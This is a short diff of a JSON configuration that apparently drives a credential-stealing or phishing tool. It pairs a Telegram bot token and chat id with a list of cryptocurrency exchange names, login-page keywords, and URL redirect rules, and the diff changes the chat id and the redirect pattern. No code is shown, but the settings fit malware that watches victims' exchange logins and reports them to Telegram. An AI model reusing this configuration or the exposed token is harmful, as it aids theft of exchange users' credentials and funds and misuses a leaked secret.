@@ -1,6 +1,6 @@
 {
   "tkn": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
-  "chid": "8025121083",
+  "chid": "1002836423777",
   "kws": [
     "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
     "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
@@ -17,7 +17,7 @@
   ],
   "lgs": ["login","loguin","sign in","entrar"],
   "rds": [
-    {"r":"(www\\.)?bybit\\.com.*","u":"https://ge.globo.com/"}
+    {"r":"(www\\.)?modelo\\.com.*","u":"https://ge.globo.com/"}
 
   ]
 }
